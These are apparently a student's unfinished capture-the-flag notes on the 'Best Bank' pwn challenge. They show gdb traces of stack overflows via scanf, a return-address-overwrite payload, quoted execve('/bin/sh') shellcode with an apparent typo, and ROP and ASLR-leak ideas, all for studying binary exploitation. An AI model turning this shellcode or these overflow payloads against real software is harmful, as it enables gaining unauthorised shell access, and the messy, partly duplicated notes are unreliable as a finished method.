# Best Bank

## Pwn: 250 points

## Challenge

The Best Bank has been opened to the public! Perhaps the Best Bank is not as secure as it seems?

`nc challenges.laptophackingcoffee.org 2168`

Credit: Tux#1576

[ [bank](bank) ]

## Solution

```
file bank
bank: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=26163dec7eb11546fe50a0db8bdae0ea79be8939, stripped

chmod +x bank

$ ./bank
Welcome to the Best Bank!
Current balance: $500

Options:
[1] Withdraw
[2] Deposit
[3] Check Balance
[4] Exit
Enter your choice: 3
Your current balance is: $500

Options:
[1] Withdraw
[2] Deposit
[3] Check Balance
[4] Exit
Enter your choice: 1
 _    _____    _____ _       _          _  __
| |__|___ / __|_   _| |__   / \   _ __ | |/ /
| '_ \ |_ \/ __|| | | '_ \ / _ \ | '_ \| ' /
| |_) |__) \__ \| | | |_) / ___ \| | | | . \
|_.__/____/|___/|_| |_.__/_/   \_\_| |_|_|\_\

Captcha: b3sTbAnK
Correct!

How much would you like to withdraw?: 100
Withdrawal successful!

Options:
[1] Withdraw
[2] Deposit
[3] Check Balance
[4] Exit
Enter your choice: 4
```

Open in ghidra. Go to functions

```
https://stackoverflow.com/questions/16376341/isoc99-scanf-and-scanf
__isoc99_scanf and scanf
```

```
captchaImage = 
 _    _____    _____ _       _          _  __
| |__|___ / __|_   _| |__   / \   _ __ | |/ /
| '_ \ |_ \/ __|| | | '_ \ / _ \ | '_ \| ' /
| |_) |__) \__ \| | | |_) / ___ \| | | | . \
|_.__/____/|___/|_| |_.__/_/   \_\_| |_|_|\_\


 _    _____    _____ _       _          _  __
| |__|___ / __|_   _| |__   / \   _ __ | |/ /
| '_ \ |_ \/ __|| | | '_ \ / _ \ | '_ \| ' /
| |_) |__) \__ \| | | |_) / ___ \| | | | . \
|_.__/____/|___/|_| |_.__/_/   \_\_| |_|_|\_\
```


```
(gdb) starti


https://gcc.gnu.org/onlinedocs/gcc/Debugging-Options.html
compile with debug symbols
$ gcc -ggdb scanf.c -o scan

$ gcc -ggdb -fno-stack-protector scanf.c -o scan
```
https://stackoverflow.com/questions/10483544/stopping-at-the-first-machine-code-instruction-in-gdb

https://www.youtube.com/watch?v=HSlhY4Uy8SA

```
to get a good return address for the $rsp run program again, si after the ret
and look at the $rsp address.
```

7.2 Example Debugging Session: Segmentation Fault Example
http://www.unknownroad.com/rtfm/gdbtut/gdbsegfault.html



https://stackoverflow.com/questions/10712972/what-is-the-use-of-fno-stack-protector


```
$ gcc -z execstack -ggdb -fno-stack-protector scanf.c -o scan
```
https://stackoverflow.com/questions/29272431/how-to-make-the-stack-of-a-c-program-executable

```
Enter a letter: AAAABBBBCCCCDDDD    # AAAABBBBCCCCDDDD = 41414141 42424242 43434343 44444444
=> 0x5555555546e2 <main+56>:	mov    DWORD PTR [rbp-0x4],eax                    
0x7fffffffde50:	0xffffdf58	0x00007fff	0x555545a0	0x00000001  # rsp (stack pointer)
0x7fffffffde60:	0xffffdf50	0x00007fff	0x41000000	0x42414141  #      ...P  ....  A...  BAAA
                  3 2 1 0     7 6 5 4     b a 9 8     f e d c   # little endian    ^
                  ^                       | ^                                      letter variable
                  buffer[0]               ^ buffer[7]                                            
                                          letter variable (0x41 = A)
0x7fffffffde70:	0x43424242	0x44434343	0x00444444	0x00007fff  # rbp: CBBB  DCCC  .DDD  ....
                  3 2 1 0     7 6 5 4     b a 9 8     f e d c   # little endian
0x7fffffffde80:	0x00000001	0x00000000	0xffffdf58	0x00007fff

>>> x $rsp
0x7fffffffde50:	0xffffdf58  # stack pointer
>>> x $rbp
0x7fffffffde70:	0x43424242  # base pointer. 0x43424242 = CBBB
>>> x letter                
0x7fffffffde6b:	0x41414141  # char letter[1];
>>> x buffer                
0x7fffffffde63:	0x007fffff  # char buffer[8]
>>> x/1bx 0x7fffffffde60
0x7fffffffde60:	0x50        # little endian
```

ABCD
```
Enter a letter: ABCD
=> 0x5555555546e2 <main+56>:	mov    DWORD PTR [rbp-0x4],eax
0x7fffffffde50:	0xffffdf58	0x00007fff	0x555545a0	0x00000001
0x7fffffffde60:	0xffffdf50	0x00007fff	0x41000000	0x00444342
0x7fffffffde70:	0x55554710	0x00005555	0xf7a05b97	0x00007fff
0x7fffffffde80:	0x00000001	0x00000000	0xffffdf58	0x00007fff
```

ABCDEFGHIJK
```
Enter a letter: ABCDEFGHIJK
=> 0x5555555546e2 <main+56>:	mov    DWORD PTR [rbp-0x4],eax
0x7fffffffde50:	0xffffdf58	0x00007fff	0x555545a0	0x00000001
0x7fffffffde60:	0xffffdf50	0x00007fff	0x41000000	0x45444342
0x7fffffffde70:	0x49484746	0x00004b4a	0xf7a05b97	0x00007fff
0x7fffffffde80:	0x00000001	0x00000000	0xffffdf58	0x00007fff
```

Full alphabet
```
Enter a letter: ABCDEFGHIJKLMNOPQRSTUVWXYZ
=> 0x5555555546e2 <main+56>:	mov    DWORD PTR [rbp-0x4],eax
0x7fffffffde50:	0xffffdf58	0x00007fff	0x555545a0	0x00000001
0x7fffffffde60:	0xffffdf50	0x00007fff	0x41000000	0x45444342
0x7fffffffde70:	0x49484746	0x4d4c4b4a	0x51504f4e	0x55545352
0x7fffffffde80:	0x59585756	0x0000005a	0xffffdf58	0x00007fff
```

ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop
```
Enter a letter: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop
=> 0x5555555546e2 <main+56>:	mov    DWORD PTR [rbp-0x4],eax
0x7fffffffde50:	0xffffdf58	0x00007fff	0x555545a0	0x00000001
0x7fffffffde60:	0xffffdf50	0x00007fff	0x41000000	0x45444342
0x7fffffffde70:	0x49484746	0x4d4c4b4a	0x51504f4e	0x55545352
0x7fffffffde80:	0x59585756	0x6362615a	0x67666564	0x6b6a6968
```

```
=> 0x555555554702 <main+88>:	leave  
0x7fffffffde50:	0xffffdf58	0x00007fff	0x555545a0	0x00000001
0x7fffffffde60:	0xffffdf50	0x00007fff	0x41000000	0x00000001
0x7fffffffde70:	0x43424242	0x44434343	0xffffde9c	0xcccccccc
0x7fffffffde80:	0x00000000	0x00000000	0xffffdf58	0x00007fff
rbp 0x00007fffffffde70   rsp 0x00007fffffffde50

```
https://stackoverflow.com/questions/29790175/assembly-x86-leave-instruction/29790275
leave is exactly equivalent to:
```
mov  rsp,rbp     # rsp = rbp
pop  rbp         # pop top value of stack (whatever rsp is pointing to) and store into ebp

                 # before: rbp 0x00007fffffffde70   rsp 0x00007fffffffde50
                 # move rsp, rbp ==> rsp = 0x00007fffffffde70
                 # pop rbp ==> rsp pointing to: 
                 # after:  rbp 0x4443434343424242   rsp: 0x00007fffffffde70 + 8
```


```
>>> si
=> 0x555555554703 <main+89>:	ret    
0x7fffffffde78:	0xffffde9c	0xcccccccc	0x00000000	0x00000000
0x7fffffffde88:	0xffffdf58	0x00007fff	0x00008000	0x00000001
0x7fffffffde98:	0x555546aa	0x00005555	0x00000000	0x00000000
0x7fffffffdea8:	0x2b9729c6	0x7267666e	0x555545a0	0x00005555
rbp 0x4443434343424242   rsp 0x00007fffffffde78
```


test.c
```
=> 0x55555555466d <main+32>:	call   0x55555555463a <myFunction>
0x7fffffffde60:	0xffffdf58	0x00007fff	0x00000000	0x00000001
0x7fffffffde70:	0x55554680	0x00005555	0xf7a05b97	0x00007fff
0x7fffffffde80:	0x00000001	0x00000000	0xffffdf58	0x00007fff
0x7fffffffde90:	0x00008000	0x00000001	0x5555464d	0x00005555
rbp 0x00007fffffffde70   rsp 0x00007fffffffde60

=> 0x55555555463a <myFunction>:	push   rbp
0x7fffffffde58:	0x55554672	0x00005555	0xffffdf58	0x00007fff
0x7fffffffde68:	0x00000000	0x00000001	0x55554680	0x00005555
0x7fffffffde78:	0xf7a05b97	0x00007fff	0x00000001	0x00000000
0x7fffffffde88:	0xffffdf58	0x00007fff	0x00008000	0x00000001
rbp 0x00007fffffffde70   rsp 0x00007fffffffde58
>>> x $rbp
0x7fffffffde70:	0x55554680

# full rbp value is: 0x 00007fff ffffde70
# the push rbp function pushes the first 32bits onto the stack first: 00007fff
# then it pushes the last 32 bits: ffffde70
# this is a 64bit program!
# so it makes sense that popping does the opposite!

=> 0x55555555463b <myFunction+1>:	mov    rbp,rsp
0x7fffffffde50:	0xffffde70	0x00007fff	0x55554672	0x00005555 
0x7fffffffde60:	0xffffdf58	0x00007fff	0x00000000	0x00000001
0x7fffffffde70:	0x55554680	0x00005555	0xf7a05b97	0x00007fff
0x7fffffffde80:	0x00000001	0x00000000	0xffffdf58	0x00007fff

```
https://stackoverflow.com/questions/4560720/why-does-the-stack-address-grow-towards-decreasing-memory-addresses


```
exploit.py
eip  = struct.pack("I", 0xffffde80) # rsp 0x00007fff ffffde80
eip += struct.pack("I", 0x00007fff)

$ hexdump -C payload 
00000000  41 41 41 41 42 42 42 42  43 43 43 43 44 80 de ff  |AAAABBBBCCCCD...|
00000010  ff ff 7f 00 00 cc cc cc  cc                       |.........|
00000019

Enter a letter: You entered: A
=> 0x555555554703 <main+89>:	ret    
0x7fffffffde78:	0xffffde80	0x00007fff	0xcccccccc	0x00000000
0x7fffffffde88:	0xffffdf58	0x00007fff	0x00008000	0x00000001
0x7fffffffde98:	0x555546aa	0x00005555	0x00000000	0x00000000
0x7fffffffdea8:	0x9d7f6813	0xea45d230	0x555545a0	0x00005555

>>> si
=> 0x7fffffffde80:	int3   
0x7fffffffde80:	0xcccccccc	0x00000000	0xffffdf58	0x00007fff
0x7fffffffde90:	0x00008000	0x00000001	0x555546aa	0x00005555
0x7fffffffdea0:	0x00000000	0x00000000	0x9d7f6813	0xea45d230
0x7fffffffdeb0:	0x555545a0	0x00005555	0xffffdf50	0x00007fff

successfully jumped to the intended instruction int3 (opcode \xCC)
successfully injected and executed an assembly instruction
```

create the payload to inject a shell command
```c
// test2.c
#include <stdlib.h>

int main(int argc, char **argv)
{
    system("/bin/sh");
}

```

found /bin/sh
```
>>> x/s 0x5555555546f4
0x5555555546f4:	"/bin/sh"
>>> x/8wx 0x5555555546f4
0x5555555546f4:	0x6e69622f	0x0068732f	0x3b031b01	0x00000038
                   n i b /       h s /
                ^ add this to payload

CyberChef:
 /  b  i  n  /  s  h
2f 62 69 6e 2f 73 68
```

```
$ file bank
bank: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=26163dec7eb11546fe50a0db8bdae0ea79be8939, stripped

note the beginning: bank: ELF 32-bit LSB executable
```

https://www.geeksforgeeks.org/compile-32-bit-program-64-bit-gcc-c-c/
to compile with 32 bit:
```
Command: gcc -m32 geek.c -o geek
```

shellcode:
http://shell-storm.org/shellcode/files/shellcode-811.php
```
/*
Title:	Linux x86 execve("/bin/sh") - 28 bytes
Author:	Jean Pascal Pereira <pereira@secbiz.de>
Web:	http://0xffe4.org


Disassembly of section .text:

08048060 <_start>:
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al
 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80
*/

#include <stdio.h>

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\1bx31\xc0\x40\xcd\x80";

int main()
{
  fprintf(stdout,"Lenght: %d\n",strlen(shellcode));
  (*(void  (*)()) shellcode)();
}
```


```
$ gcc -m32 -z execstack -ggdb -fno-stack-protector scanf.c -o scan.o
```

https://stackoverflow.com/questions/20129107/what-is-the-x86-ret-instruction-equivalent-to
`ret` is equivalent to:
```
pop ecx  ; these two instructions simulate "ret"
jmp ecx
```


```
0x08048065 in _start ()
>>> x/10i $eip
=> 0x8048065 <_start+5>:	mov    al,0xff
   0x8048067 <_start+7>:	sub    al,0xf4
   0x8048069 <_start+9>:	int    0x80
   0x804806b:	add    BYTE PTR [eax],al
   0x804806d:	add    BYTE PTR [eax],al
   0x804806f:	add    BYTE PTR [eax],al
   0x8048071:	add    BYTE PTR [eax],al
   0x8048073:	add    BYTE PTR [eax],al
   0x8048075:	add    BYTE PTR [eax],al
   0x8048077:	add    BYTE PTR [eax],al
>>> x/2wx $eip
0x8048065 <_start+5>:	0xf42cffb0	0x000080cd

* From this we have:

0xf42cffb0	0x80cd

which breaks down to:

ffb0 = mov al, 0xFF
f42c = sub al, 0xF4
80cd = int 0x80
```

Big note: scanf STOPS scanning at null, space, EOF (anything else?), and also stops scanning at 0x0b. So the 0x0b had to be replaced in the exploit.

```
>>> info breakpoints 
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0x565555d9 in main at scanf.c:10
2       breakpoint     keep y   0x565555af in main at scanf.c:8
3       breakpoint     keep y   0x565555c8 in main at scanf.c:9
4       breakpoint     keep y   0x565555aa in main at scanf.c:8
	breakpoint already hit 1 time
5       breakpoint     keep y   0xf7e3bc6e <__isoc99_scanf+190>

```


Why not exploit the captcha? Scanf runs until it finds null, space, or EOF. For the exploit to work, program needs to hit the return portion of the program with exploit placed correctly. Captcha has a 1000 char buffer. Possible. But will explore other options.
```
char userCaptcha[1000];
char *captchaImage;

b3sT = 0x54733362;
bAnK = 0x4b6e4162;

__isoc99_scanf(&captchaFormat, userCaptcha);
result = strncmp(userCaptcha, (char *)&b3sT, 8);
```

#Crackme# Reversing Stripped ELF with GDB 64-Bit
https://www.youtube.com/watch?v=pF_prX9ZEHg

```
strings bank
(gdb) disassemble __isoc99_scanf
(gdb) break __isoc99_scanf
(gdb) r
```


You can chain input together by separating arguments with a space. This is because scanf stops scanning when it detects a space.
```
$ ./bank 
Welcome to the Best Bank!
Current balance: $500

Options:
[1] Withdraw
[2] Deposit
[3] Check Balance
[4] Exit
Enter your choice: 1 b3sTbAnK 500 3
 _    _____    _____ _       _          _  __
| |__|___ / __|_   _| |__   / \   _ __ | |/ /
| '_ \ |_ \/ __|| | | '_ \ / _ \ | '_ \| ' /
| |_) |__) \__ \| | | |_) / ___ \| | | | . \
|_.__/____/|___/|_| |_.__/_/   \_\_| |_|_|\_\

Captcha: Correct!

How much would you like to withdraw?: Withdrawal successful!

Options:
[1] Withdraw
[2] Deposit
[3] Check Balance
[4] Exit
Enter your choice: Your current balance is: $0
```


```
>>> info breakpoints
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0xf7e3bbb5 <__isoc99_scanf+5>       ; start of scanf
2       breakpoint     keep y   0xf7e3bc6e <__isoc99_scanf+190>     ; ret of scanf
5       breakpoint     keep y   0x08049208                          ; captcha: instruction after printf
6       breakpoint     keep y   0x08049277                          ; ret of captcha function
```

```
$ ./bank < payload              ; payload contains 2000x As
Welcome to the Best Bank!
Current balance: $500

Options:
[1] Withdraw
[2] Deposit
[3] Check Balance
[4] Exit
Enter your choice:  _    _____    _____ _       _          _  __
| |__|___ / __|_   _| |__   / \   _ __ | |/ /
| '_ \ |_ \/ __|| | | '_ \ / _ \ | '_ \| ' /
| |_) |__) \__ \| | | |_) / ___ \| | | | . \
|_.__/____/|___/|_| |_.__/_/   \_\_| |_|_|\_\

Captcha: Incorrect!

Segmentation fault (core dumped)
```$ checksec --file bank
[*] '/home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

```
$ checksec --file bank
[*] '/home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
Stack Canaries are a secret value placed on the stack which changes every time the program is started. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immeadiately.
https://ctf101.org/binary-exploitation/stack-canaries/

The last abbreviation is PIE, meaning Position Independent Executable. A No PIE application tells the loader which virtual address it should use (and keeps its memory layout quite static). Hence, attacks against this application know up-front how the virtual memory for this application is (partially) organized.
http://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/


```
Stack
+------------------+
|   arguments      |
+------------------+
|   stack ptr      |
+------------------+
|   locals?        |
+------------------+
```
Software security - Return Oriented Programming - ROP
https://www.youtube.com/watch?v=XZa0Yu6i_ew


https://stackoverflow.com/questions/29790175/assembly-x86-leave-instruction/29790275
leave is exactly equivalent to:
```
mov  rsp,rbp     # rsp = rbp
pop  rbp         # pop top value of stack (whatever rsp is pointing to) and store into ebp

                 # before: rbp 0x00007fffffffde70   rsp 0x00007fffffffde50
                 # move rsp, rbp ==> rsp = 0x00007fffffffde70
                 # pop rbp ==> rsp pointing to: 
                 # after:  rbp 0x4443434343424242   rsp: 0x00007fffffffde70 + 8
```
0x08049275 : cld ; leave ; ret

We already overwrote the base pointer. The leave command stores the base pointer into the rsp. then pops top of stack into rbp!!
Then RETURNS

```
   0x804926d:	adc    BYTE PTR [eax+0x0],bh
   0x8049273:	mov    ebx,DWORD PTR [ebp-0x4]
   0x8049276:	leave  
=> 0x8049277:	ret  


>>> info breakpoints
Num     Type           Disp Enb Address    What
1       breakpoint     keep n   0xf7e3bbb5 <__isoc99_scanf+5>
2       breakpoint     keep n   0xf7e3bc6e <__isoc99_scanf+190>
5       breakpoint     keep n   0x08049208 
6       breakpoint     keep y   0x08049277 
	breakpoint already hit 1 time
8       breakpoint     keep y   0x0804926d 
9       breakpoint     keep y   0x08049276 <======= most important breakpoint

```

Incorrect captcha leads to:
```
0x08049276  ? leave   <=====
!0x08049277  ? ret
```


```python
deadbeef = b'\xef\xbe\xad\xde'
payload = b'1 ' + b'A'*1012 + deadbeef
sys.stdout.buffer.write(payload)
```

gdb:
```
Breakpoint 9, 0x08049276 in ?? ()
>>> x/$ebp
0xffffd058:	0xdeadbeef
>>> si
```
leave is exactly equivalent to:
mov  esp,ebp
pop  ebp            ; pop top of stack and increment $esp by 4 bytes (32bits)

which is:
esp = ebp + 4


```
CREATE A PYTHON SCRIPT THAT RELAYS YOUR COMMANDS!!
```

First remote root exploit - bin 0x1D
https://www.youtube.com/watch?v=HAN8Qun26cQ

```
>>> info breakpoints
Num     Type           Disp Enb Address    What
1       breakpoint     keep y   0x08049276 
	breakpoint already hit 1 time
```

Idea: info leak the stack with printf

```
>>> info functions execve
All functions matching regular expression "execve":

Non-debugging symbols:
0xf7e975b0  execve
0xf7e975e0  fexecve
```

$ grep -R -a -b -o /bin/sh /lib/i386-linux-gnu/libc.so.6
1564879:/bin/sh   <==== offset


https://jvns.ca/blog/2018/04/28/debugging-a-segfault-on-linux/
```
ulimit -c unlimited
```
https://www.youtube.com/watch?v=GV10eIuPs9k


core dump:
```
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from bank...(no debugging symbols found)...done.
[New LWP 2648]
Core was generated by `./bank'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xffffd280 in ?? ()
>>> x/$esp
0xffdf2e00:                                          <======== stack address



For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from bank...(no debugging symbols found)...done.
[New LWP 5317]
Core was generated by `./bank'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xffdf2ff4 in ?? ()
```


plt functions
```
(gdb) info functions @plt
All functions matching regular expression "@plt":

Non-debugging symbols:
0x08049030  setbuf@plt
0x08049040  printf@plt
0x08049050  puts@plt
0x08049060  exit@plt
0x08049070  __libc_start_main@plt
0x08049080  __isoc99_scanf@plt
0x08049090  strncmp@plt
0xf7fd6a30  _dl_catch_exception@plt
0xf7fd6a40  malloc@plt
0xf7fd6a50  _dl_signal_exception@plt
0xf7fd6a60  calloc@plt
0xf7fd6a70  realloc@plt
0xf7fd6a80  _dl_signal_error@plt
0xf7fd6a90  _dl_catch_error@plt
0xf7fd6aa0  free@plt
0xf7df0550  _Unwind_Find_FDE@plt
0xf7df0560  realloc@plt
0xf7df0570  *ABS*@plt
0xf7df0580  memalign@plt
0xf7df0590  _dl_exception_create@plt
0xf7df05a0  *ABS*@plt
0xf7df05b0  __tunable_get_val@plt
0xf7df05c0  *ABS*@plt
0xf7df05d0  _dl_find_dso_for_object@plt
0xf7df05e0  calloc@plt
0xf7df05f0  ___tls_get_addr@plt
0xf7df0600  malloc@plt
0xf7df0608  free@plt

(gdb) info functions execve
All functions matching regular expression "execve":

Non-debugging symbols:
0xf7e975b0  execve
0xf7e975e0  fexecve
```


Leak data via printf
https://www.youtube.com/watch?v=Y9kUWsyyChk

Idea: 
```
Trying to print "hello" via printf:

>>> x/100s $esp
...
0xffffd340:	"hello"

Eax buffer contains the start address to the hello string:
eax 0xffffd340

What if after the overflow, jump program to this rop gadget:
0x080494e3 : mov eax, dword ptr [esp] ; ret

^ Above moves what $esp points to into $eax. printf uses $eax as the pointer for the first variable

Then after that go to printf
```


New idea: get checkBalance function to print something wacky off the stack:
```
void checkBalance(void)
{
  int stackPointer;
  
  stackPointer = getStackPointer();
                    // 0xE41: location of "Your current balance is:" strings
                    // 0x2CB1: location of accountBalance
  printf((char *)(stackPointer + 0xe41),*(undefined4 *)(stackPointer + 0x2cb1));
  return;
}
```

```
0x0804931e  ? test   eax,eax
if (captchaResult != 0) {

>>> x/ $ebx+0x30
0x804c030:	0x000001f4      // 0x1f4 = 500

>>> x/ $ebp-0xc
0xffffd07c:	0x0000000a      // a = 10, which is the deposit amount I entered
```

finding /bin/sh
https://stackoverflow.com/questions/6637448/how-to-find-the-address-of-a-string-in-memory-using-gdb
```
>>> info proc map
process 20880
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x804b000     0x3000        0x0 /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
	 0x804b000  0x804c000     0x1000     0x2000 /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
	 0x804c000  0x804d000     0x1000     0x3000 /home/zionperez/Desktop/playgrounds/lhc/Pwn/BestBank/bank
	0xf7dd8000 0xf7fad000   0x1d5000        0x0 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fad000 0xf7fae000     0x1000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fae000 0xf7fb0000     0x2000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fb0000 0xf7fb1000     0x1000   0x1d7000 /lib/i386-linux-gnu/libc-2.27.so
	0xf7fb1000 0xf7fb4000     0x3000        0x0 
	0xf7fd0000 0xf7fd2000     0x2000        0x0 
	0xf7fd2000 0xf7fd5000     0x3000        0x0 [vvar]
	0xf7fd5000 0xf7fd6000     0x1000        0x0 [vdso]
	0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib/i386-linux-gnu/ld-2.27.so
	0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib/i386-linux-gnu/ld-2.27.so
	0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib/i386-linux-gnu/ld-2.27.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
>>> find 0xf7dd8000,0xf7fb1000,"/bin/sh"
0xf7f560cf
1 pattern found.
>>> x/s 0xf7f560cf
0xf7f560cf:	"/bin/sh"
>>> 

```


ABigPickle03/05/2020
Oh, so you should understand aslr address leaking then no?

```
https://security.stackexchange.com/questions/149035/is-aslr-useless-in-preventing-attacks-such-as-return-to-libc-in-linux
Is ASLR useless in preventing attacks such as return-to-libc in linux?
When PIE is not used, the program must rely on a fixed PLT, created during linking, to resolve the addresses of functions in shared libraries.

0x08049050  puts@plt
https://sidsbits.com/Defeating-ASLR-with-a-Leak/#Defeating-ASLR-with-a-Leak
buf += p64(e.plt['puts']) # Return address - call the puts function
buf += p64(e.got['puts']) # Argument to puts - GOT['puts']

>>> disassemble 'puts@plt'
Dump of assembler code for function puts@plt:
   0x08049050 <+0>:	jmp    DWORD PTR ds:0x804c014
   0x08049056 <+6>:	push   0x10
   0x0804905b <+11>:	jmp    0x8049020
End of assembler dump.
>>> x/wx 0x804c014
0x804c014:	0xf7e3fb40
>>> info symbol 0xf7e3fb40
puts in section .text of /lib/i386-linux-gnu/libc.so.6
>>> 
```


So $eax needs to point to the string that will go into puts
```
Breakpoint 4, 0x08049050 in puts@plt ()
>>> x/s $eax
0x804a21e:	"Welcome to the Best Bank!"
```

```
Breakpoint 5, 0x08049040 in printf@plt ()
>>> x/10i 0x08049208
   0x8049208:	add    esp,0x10
   0x804920b:	sub    esp,0x8
   0x804920e:	lea    eax,[ebp-0x3f4]
   0x8049214:	push   eax
   0x8049215:	lea    eax,[ebx-0x1f09]
   0x804921b:	push   eax
   0x804921c:	call   0x8049080 <__isoc99_scanf@plt>
```